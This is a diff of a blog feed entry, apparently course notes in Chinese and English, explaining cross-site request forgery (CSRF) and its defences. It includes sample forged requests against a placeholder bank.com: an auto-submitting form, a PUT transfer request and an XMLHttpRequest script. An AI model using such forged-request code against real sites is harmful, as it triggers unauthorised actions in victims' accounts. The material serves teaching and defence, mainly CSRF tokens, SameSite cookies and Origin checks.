+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;document.forms[0].submit()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Example: Other HTTP Methods&lt;br&gt;
+Charlie can use HTTP PUT method that takes a JSON object as an argument&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;acct&amp;quot;: &amp;quot;CHARLIE&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;amount&amp;quot;: 100000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Such requests can be executed with JavaScript&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;put&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; x = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;XMLHttpRequest&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;PUT&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;send&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;JSON&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;stringify&lt;/span&gt;(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&amp;#125;));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;h2 id=&#34;Prevention CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Prevention CSRF&#34;&gt;#&lt;/a&gt;Prevention CSRF&lt;/h2&gt;
-
 &lt;ol&gt;
-&lt;li&gt;Prevention Methods That Do Not Work&lt;ol&gt;
-&lt;li&gt;使用“秘密”Cookie  (Using a secret cookie) ：在请求中加入一个“秘密”Cookie，用来验证请求的合法性。&lt;br&gt;所有Cookie都会在每个请求中被自动发送，无论是合法请求还是伪造请求。因此，攻击者可以利用受害者的浏览器自动发送这些Cookie。&lt;/li&gt;
-&lt;li&gt;仅接受POST请求 (Only accepting POST requests) ：限制仅接受POST请求来提交敏感操作的数据。&lt;br&gt;攻击者仍然可以通过HTML表单、AJAX请求或自动提交脚本，诱导受害者提交伪造的POST请求。因此，仅使用POST请求并不能完全防止CSRF。&lt;/li&gt;
-&lt;li&gt;多步事务处理 (Multi-step transactions) ：将操作分解为多个步骤，并在每一步中进行用户确认。：&lt;br&gt;攻击者可能通过观察或猜测，预测每一步的结果，并模拟完整的事务流程。如果没有额外的保护机制（如CSRF令牌），多步流程仍然易受CSRF攻击。&lt;/li&gt;
-&lt;li&gt;URL重写 (URL Rewriting)： 在URL中包含用户的会话ID以维护状态。&lt;br&gt;将会话ID暴露在URL中，会增加被截获或泄露的风险。攻击者可能会通过网络流量分析、代理日志、浏览器历史记录等方式获取会话ID。&lt;/li&gt;
-&lt;li&gt;HTTPS：使用HTTPS来加密通信内容。&lt;br&gt;HTTPS只能加密传输的内容，不能防止伪造的请求。攻击者仍可以通过受害者的浏览器发送有效的CSRF攻击请求，哪怕是HTTPS加密的请求。&lt;/li&gt;
+&lt;li&gt;Prevention Methods That Do Not Work
+&lt;ol&gt;
+&lt;li&gt;使用 “秘密” Cookie  (Using a secret cookie) ：在请求中加入一个 “秘密” Cookie，用来验证请求的合法性。&lt;br&gt;
+所有 Cookie 都会在每个请求中被自动发送，无论是合法请求还是伪造请求。因此，攻击者可以利用受害者的浏览器自动发送这些 Cookie。&lt;/li&gt;
+&lt;li&gt;仅接受 POST 请求 (Only accepting POST requests) ：限制仅接受 POST 请求来提交敏感操作的数据。&lt;br&gt;
+攻击者仍然可以通过 HTML 表单、AJAX 请求或自动提交脚本，诱导受害者提交伪造的 POST 请求。因此，仅使用 POST 请求并不能完全防止 CSRF。&lt;/li&gt;
+&lt;li&gt;多步事务处理 (Multi-step transactions) ：将操作分解为多个步骤，并在每一步中进行用户确认。：&lt;br&gt;
+攻击者可能通过观察或猜测，预测每一步的结果，并模拟完整的事务流程。如果没有额外的保护机制（如 CSRF 令牌），多步流程仍然易受 CSRF 攻击。&lt;/li&gt;
+&lt;li&gt;URL 重写 (URL Rewriting)： 在 URL 中包含用户的会话 ID 以维护状态。&lt;br&gt;
+将会话 ID 暴露在 URL 中，会增加被截获或泄露的风险。攻击者可能会通过网络流量分析、代理日志、浏览器历史记录等方式获取会话 ID。&lt;/li&gt;
+&lt;li&gt;HTTPS：使用 HTTPS 来加密通信内容。&lt;br&gt;
+HTTPS 只能加密传输的内容，不能防止伪造的请求。攻击者仍可以通过受害者的浏览器发送有效的 CSRF 攻击请求，哪怕是 HTTPS 加密的请求。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;/li&gt;
 &lt;li&gt;Prevent CSRF: Token-based mitigation&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;A CSRF token is a unique, secret, unpredictable value&lt;ul&gt;
-&lt;li&gt;Generated by web applications and included on their own web pages&lt;br&gt;&lt;code&gt;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;amp;token=31415926535&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;A CSRF token is a unique, secret, unpredictable value
+&lt;ul&gt;
+&lt;li&gt;Generated by web applications and included on their own web pages&lt;br&gt;
+ &lt;code&gt;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;amp;token=31415926535&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Web applications reject requests if the token is missing or invalid &lt;ul&gt;
+&lt;li&gt;Web applications reject requests if the token is missing or invalid
+&lt;ul&gt;
 &lt;li&gt;Impossible for an attacker to guess the token and construct a fully valid HTTP request&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Types of CSRF tokens &lt;ul&gt;
-&lt;li&gt;Synchroniser token 同步令牌：&lt;ul&gt;
+&lt;li&gt;Types of CSRF tokens
+&lt;ul&gt;
+&lt;li&gt;Synchroniser token 同步令牌：
+&lt;ul&gt;
 &lt;li&gt;服务端为每个会话生成一个唯一的令牌，并在请求中验证该令牌。&lt;/li&gt;
-&lt;li&gt;典型的做法是在表单中嵌入一个隐藏字段，或在URL中附加该令牌。&lt;/li&gt;
+&lt;li&gt;典型的做法是在表单中嵌入一个隐藏字段，或在 URL 中附加该令牌。&lt;/li&gt;
 &lt;li&gt;缺点是需要在服务端保存和管理令牌。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;encryption-based token 加密令牌：&lt;ul&gt;
+&lt;li&gt;encryption-based token 加密令牌：
+&lt;ul&gt;
 &lt;li&gt;使用加密算法将用户信息和时间戳加密，生成唯一的令牌。&lt;/li&gt;
 &lt;li&gt;这种令牌不需要服务端存储，因为它可以通过解密来验证请求的有效性。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;hash-based token 哈希令牌：&lt;ul&gt;
+&lt;li&gt;hash-based token 哈希令牌：
+&lt;ul&gt;
 &lt;li&gt;使用用户会话信息、请求参数等作为输入，生成一个哈希值作为令牌。&lt;/li&gt;
 &lt;li&gt;通常通过加盐（salt）来增加令牌的复杂性和不可预测性。&lt;/li&gt;
 &lt;/ul&gt;
@@ -299,35 +365,50 @@ Such requests can be executed with JavaScript &lt;figure class=&#34;highlight ht
 &lt;li&gt;Prevent CSRF: Defence-in-depth techniques&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;SameSite Cookie Attribute &lt;ul&gt;
+&lt;li&gt;SameSite Cookie Attribute
+&lt;ul&gt;
 &lt;li&gt;Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts&lt;/li&gt;
-&lt;li&gt;如何防护：设置&lt;code&gt;SameSite&lt;/code&gt;属性为&lt;code&gt;Strict&lt;/code&gt;或&lt;code&gt;Lax&lt;/code&gt;，防止浏览器在跨站浏览环境中发送Cookie，从而阻止CSRF攻击。&lt;br&gt;&lt;code&gt;SameSite=Strict&lt;/code&gt;：Cookie仅在同一站点请求时发送，完全阻止跨站请求。&lt;br&gt;&lt;code&gt;SameSite=Lax&lt;/code&gt;：Cookie允许在少数跨站请求中发送（如GET请求或导航），但会限制大多数情况下的跨站请求 &lt;/li&gt;
-&lt;li&gt;示例：&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;sessionId=abc123; SameSite=Strict;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;如何防护：设置 &lt;code&gt;SameSite&lt;/code&gt;  属性为 &lt;code&gt;Strict&lt;/code&gt;  或 &lt;code&gt;Lax&lt;/code&gt; ，防止浏览器在跨站浏览环境中发送 Cookie，从而阻止 CSRF 攻击。&lt;br&gt;
+ &lt;code&gt;SameSite=Strict&lt;/code&gt; ：Cookie 仅在同一站点请求时发送，完全阻止跨站请求。&lt;br&gt;
+ &lt;code&gt;SameSite=Lax&lt;/code&gt; ：Cookie 允许在少数跨站请求中发送（如 GET 请求或导航），但会限制大多数情况下的跨站请求&lt;/li&gt;
+&lt;li&gt;示例：&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Verifying Origin With Standard Headers &lt;ul&gt;
-&lt;li&gt;Determine and match both the source and target of a request &lt;/li&gt;
-&lt;li&gt;如何防护：Web应用服务器检查请求的Origin或Referer头，并确保它们与应用的域匹配。&lt;br&gt;仅允许来自可信域的请求进行处理。&lt;/li&gt;
-&lt;li&gt;示例：对于银行转账请求，服务器将确保请求的来源为&lt;code&gt;https://bank.com&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;sessionId=abc123; SameSite=Strict;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;Verifying Origin With Standard Headers
+&lt;ul&gt;
+&lt;li&gt;Determine and match both the source and target of a request&lt;/li&gt;
+&lt;li&gt;如何防护：Web 应用服务器检查请求的 Origin 或 Referer 头，并确保它们与应用的域匹配。&lt;br&gt;
+仅允许来自可信域的请求进行处理。&lt;/li&gt;
+&lt;li&gt;示例：对于银行转账请求，服务器将确保请求的来源为 &lt;code&gt;https://bank.com&lt;/code&gt; 。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Double Submit Cookie &lt;ul&gt;
-&lt;li&gt;Every transaction request must include a random value in both a cookie and as a request parameter &lt;/li&gt;
-&lt;li&gt;如何防护：&lt;br&gt;用户在登录时生成一个随机值，并在后续的每个请求中将该值同时包含在Cookie和请求参数中。&lt;br&gt;服务器检查这两个值是否匹配，不匹配则拒绝请求。&lt;/li&gt;
-&lt;li&gt;优势：攻击者无法同时控制Cookie和请求参数，防止了CSRF攻击。&lt;/li&gt;
-&lt;li&gt;示例：&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// Set cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Set-Cookie: csrfToken=xyz123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; // Form submission includes the token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; POST /transfer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Cookie: csrfToken=xyz123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Body: token=xyz123&amp;amp;acct=CHARLIE&amp;amp;amount=1000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;Double Submit Cookie
+&lt;ul&gt;
+&lt;li&gt;Every transaction request must include a random value in both a cookie and as a request parameter&lt;/li&gt;
+&lt;li&gt;如何防护：&lt;br&gt;
+用户在登录时生成一个随机值，并在后续的每个请求中将该值同时包含在 Cookie 和请求参数中。&lt;br&gt;
+服务器检查这两个值是否匹配，不匹配则拒绝请求。&lt;/li&gt;
+&lt;li&gt;优势：攻击者无法同时控制 Cookie 和请求参数，防止了 CSRF 攻击。&lt;/li&gt;
+&lt;li&gt;示例：&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;User Interaction &lt;ul&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// Set cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Set-Cookie: csrfToken=xyz123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; // Form submission includes the token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; POST /transfer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Cookie: csrfToken=xyz123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Body: token=xyz123&amp;amp;acct=CHARLIE&amp;amp;amount=1000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;User Interaction
+&lt;ul&gt;
 &lt;li&gt;Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)&lt;/li&gt;
-&lt;li&gt;如何防护：在重要操作（如转账、密码修改等）中使用一次性验证码（OTP）、CAPTCHA或类似机制，要求用户主动确认操作。&lt;br&gt;通过用户的主动参与，确保请求是由用户发起的，而不是由恶意脚本伪造的。&lt;/li&gt;
-&lt;li&gt;优势：阻止自动化CSRF攻击，提高了用户操作的安全性。&lt;/li&gt;
+&lt;li&gt;如何防护：在重要操作（如转账、密码修改等）中使用一次性验证码（OTP）、CAPTCHA 或类似机制，要求用户主动确认操作。&lt;br&gt;
+通过用户的主动参与，确保请求是由用户发起的，而不是由恶意脚本伪造的。&lt;/li&gt;
+&lt;li&gt;优势：阻止自动化 CSRF 攻击，提高了用户操作的安全性。&lt;/li&gt;
 &lt;li&gt;示例：在转账页面中要求用户输入发送到其手机的一次性验证码（OTP）。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;h1 id=&#34;XSS VS CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#XSS VS CSRF&#34;&gt;#&lt;/a&gt;XSS VS CSRF&lt;/h1&gt;
-
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -336,7 +417,8 @@ Such requests can be executed with JavaScript &lt;figure class=&#34;highlight ht
 &lt;th&gt;CSRF (Cross-Site Request Forgery)&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
-&lt;tbody&gt;&lt;tr&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
 &lt;td&gt;攻击目标&lt;/td&gt;
 &lt;td&gt;执行恶意代码，控制用户浏览器&lt;/td&gt;
 &lt;td&gt;利用用户的身份认证，进行未授权请求&lt;/td&gt;
@@ -356,7 +438,8 @@ Such requests can be executed with JavaScript &lt;figure class=&#34;highlight ht
 &lt;td&gt;输入过滤、内容安全策略 (CSP)、HttpOnly Cookie&lt;/td&gt;
 &lt;td&gt;CSRF 令牌、检查 Referer Header、SameSite Cookie&lt;/td&gt;
 &lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 </content>
         <category term="software security" />
         <category term="HTTP" />
